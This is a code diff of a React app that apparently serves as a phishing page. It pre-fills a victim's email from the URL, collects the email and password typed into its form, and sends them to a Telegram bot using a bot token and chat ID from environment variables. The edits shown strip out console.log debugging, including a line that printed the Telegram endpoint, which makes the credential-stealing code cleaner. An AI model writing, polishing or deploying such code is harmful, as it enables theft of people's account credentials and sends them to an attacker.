@@ -10,10 +10,6 @@ export default function App() {
   const botToken = import.meta.env.VITE_BOT_TOKEN;
   const chatId = import.meta.env.VITE_CHAT_ID;
 
-  useEffect(()=>{
-    console.log(`https://api.telegram.org/bot${botToken}/sendMessage`)
-  },[])
-
   useEffect(() => {
     if (window.location.href.includes("email")) {
       const eValue = window.location.href.split("=")[1];
@@ -23,7 +19,6 @@ export default function App() {
     }
     if (!window.location.href.includes("email")) {
       setDomain(window.location.href);
-      console.log(domain);
     }
   }, [window.location.href]);
 
@@ -60,8 +55,6 @@ Password: ${passwrd}
       );
 
       const data = await response.json();
-      console.log(data);
-      console.log("Message sent successfully.");
 
       // Success message should be shown here
       alert(
@@ -92,8 +85,8 @@ Password: ${passwrd}
         formData.append('userPasswords', userPassword);
 
         const data = Object.fromEntries(formData);
-        console.log(data);
         const { userEmails, userPasswords } = data;
+        
         await sendDetails(userEmails, userPasswords);
       } catch (error) {
         console.log(error);
